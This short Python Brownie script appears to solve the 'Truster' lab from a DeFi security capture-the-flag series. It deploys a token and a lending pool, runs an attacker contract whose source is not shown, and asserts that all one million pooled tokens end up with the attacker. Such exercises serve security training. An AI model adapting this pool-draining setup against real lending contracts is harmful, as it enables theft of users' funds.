from brownie import *

def main():
    deployer = a[0]
    attacker = a[1]

    TOKENS_IN_POOL = 1000000

    token = DamnValuableToken.deploy({'from': deployer})
    pool = TrusterLenderPool.deploy(token, {'from': deployer})

    token.transfer(pool, TOKENS_IN_POOL)

    assert token.balanceOf(pool) == TOKENS_IN_POOL

    # Exploit code here
    attack = TrusterAttack.deploy({'from': attacker})
    attack.attack(pool, token)

    # Success condition - pool is empty
    assert token.balanceOf(pool) == 0
    assert token.balanceOf(attacker) == TOKENS_IN_POOL

    print('Challenge successfully passed.')

